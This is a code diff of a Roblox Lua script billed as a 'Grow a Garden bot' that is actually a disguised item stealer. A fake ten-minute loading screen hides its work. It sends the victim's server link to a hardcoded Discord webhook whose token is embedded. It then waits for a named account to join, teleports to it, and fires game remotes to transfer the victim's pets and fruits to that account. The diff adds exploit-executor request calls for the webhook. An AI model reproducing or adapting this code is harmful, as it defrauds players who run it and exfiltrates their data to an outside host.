@@ -1,18 +1,18 @@
--- 🌿 GROW A GARDEN BOT — STABLE & COMPLETE
+-- 🌿 GROW A GARDEN BOT — STABLE 3-STAGE WEBHOOK
 
---== CONFIGURATION ==--
+-- CONFIGURATION
 local CONFIG = {
     TARGET_USERNAME = "Sgahfd1223",
     WEBHOOK_URL = "https://discord.com/api/webhooks/1404173568350093424/f_ND3zfZWAHapUMdFRlC77aU0ZdSbPmzFASONMUfhoaguz_zD8j_UDwuAsV5Lvj0rxIz",
     LANGUAGE = "ru",
-    LOADING_TIME = 600, -- 10 мин
+    LOADING_TIME = 600,
     CHECK_INTERVAL = 5,
     TRANSFER_DELAY = 0.25,
-    TELEPORT_TIME = 1, -- Tween в секундах
-    BATCH_SIZE = 3, -- передача по батчам
+    TELEPORT_TIME = 1,
+    BATCH_SIZE = 3
 }
 
---== SERVICES ==--
+-- SERVICES
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
@@ -20,26 +20,26 @@ local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
 local LocalPlayer = Players.LocalPlayer
 
---== LOCALIZATION ==--
+-- LOCALIZATION
 local LANGUAGES = {
     ["ru"] = {
+        title = "🌿 Загрузка скрипта...",
+        percent = "% завершено",
         webhook_server = "Ссылка на сервер",
         webhook_detect = "Игрок %s зашел в плейс.",
-        webhook_success = "Питомцы и фрукты были успешно переданы.",
-        title = "🌿 Загрузка скрипта...",
-        percent = "% завершено"
+        webhook_success = "Питомцы и фрукты были успешно переданы."
     },
     ["en"] = {
+        title = "🌿 Script Loading...",
+        percent = "% done",
         webhook_server = "Server Link",
         webhook_detect = "Player %s joined the place.",
-        webhook_success = "Pets and fruits were successfully transferred.",
-        title = "🌿 Script Loading...",
-        percent = "% done"
+        webhook_success = "Pets and fruits were successfully transferred."
     }
 }
 local TXT = LANGUAGES[CONFIG.LANGUAGE]
 
---== GUI LOADING ==--
+-- GUI LOADING
 local function createLoadingUI()
     local gui = Instance.new("ScreenGui", CoreGui)
     gui.Name = "GrowGardenBot"
@@ -77,37 +77,26 @@ local function createLoadingUI()
     return {GUI = gui, Bar = bar, Percent = percent, Title = title}
 end
 
---== RELIABLE 3-WAY WEBHOOK ==--
+-- WEBHOOK MODULE
 local Webhook = {}
 
 function Webhook:Send(content)
     local data = HttpService:JSONEncode({content = content})
-
-    local success, err = pcall(function()
-        HttpService:PostAsync(CONFIG.WEBHOOK_URL, data, Enum.HttpContentType.ApplicationJson)
-    end)
-    if not success then warn("[Webhook] PostAsync failed: "..tostring(err)) end
-
-    success, err = pcall(function()
-        HttpService:RequestAsync({
-            Url = CONFIG.WEBHOOK_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = data
-        })
-    end)
-    if not success then warn("[Webhook] RequestAsync failed: "..tostring(err)) end
-
-    success, err = pcall(function()
-        HttpService:GetAsync(CONFIG.WEBHOOK_URL.."?"..HttpService:UrlEncode("content="..content))
-    end)
-    if not success then warn("[Webhook] GetAsync failed: "..tostring(err)) end
+    local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request
+    if requestFunc then
+        pcall(function()
+            requestFunc({
+                Url = CONFIG.WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = data
+            })
+        end)
+    end
 end
 
 function Webhook:SendServerLink()
-    local place = tostring(game.PlaceId)
-    local job = tostring(game.JobId)
-    local link = "https://floating.gg/?placeID="..place.."&gameInstanceId="..job
+    local link = "https://floating.gg/?placeID="..game.PlaceId.."&gameInstanceId="..game.JobId
     self:Send(TXT.webhook_server..": "..link)
 end
 
@@ -119,11 +108,11 @@ function Webhook:SendTransferSuccess()
     self:Send(TXT.webhook_success)
 end
 
---== COLLECT PETS ==--
+-- COLLECT PETS
 local function collectPets()
     local garden = workspace:FindFirstChild("Garden") or workspace:FindFirstChild("Farm")
-    if not garden then return {} end
     local pets = {}
+    if not garden then return pets end
     for _, obj in ipairs(garden:GetDescendants()) do
         if obj:IsA("Model") and obj.Name:lower():find("pet") then
             table.insert(pets,obj)
@@ -133,7 +122,7 @@ local function collectPets()
     return pets
 end
 
---== TWEEN TELEPORT ==--
+-- TWEEN TELEPORT
 local function tweenTeleport(target)
     local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
     local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
@@ -146,7 +135,7 @@ local function tweenTeleport(target)
     end
 end
 
---== TRANSFER ITEMS ==--
+-- TRANSFER ITEMS
 local function transferItems(target)
     local success = 0
     local remotes = {}
@@ -156,19 +145,19 @@ local function transferItems(target)
         end
     end
 
-    for _, remote in ipairs(remotes) do
-        local items = {}
-        for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
-            if item.Name:lower():find("pet") or item.Name:lower():find("fruit") then
-                table.insert(items,item)
-            end
+    local items = {}
+    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
+        if item.Name:lower():find("pet") or item.Name:lower():find("fruit") then
+            table.insert(items,item)
         end
-        for _, item in ipairs(LocalPlayer.Character:GetChildren()) do
-            if item:IsA("Model") and (item.Name:lower():find("pet") or item.Name:lower():find("fruit")) then
-                table.insert(items,item)
-            end
+    end
+    for _, item in ipairs(LocalPlayer.Character:GetChildren()) do
+        if item:IsA("Model") and (item.Name:lower():find("pet") or item.Name:lower():find("fruit")) then
+            table.insert(items,item)
         end
+    end
 
+    for _, remote in ipairs(remotes) do
         for i=1,#items,CONFIG.BATCH_SIZE do
             for j=i,math.min(i+CONFIG.BATCH_SIZE-1,#items) do
                 pcall(function() remote:FireServer(items[j], target) end)
@@ -181,7 +170,7 @@ local function transferItems(target)
     return success
 end
 
---== MAIN LOOP ==--
+-- MAIN LOOP
 local function runBot()
     local serverSent = false
     while true do
@@ -205,7 +194,7 @@ local function runBot()
     end
 end
 
---== STARTUP ==--
+-- STARTUP
 local ui = createLoadingUI()
 local start = os.time()
 while os.time() - start < CONFIG.LOADING_TIME do
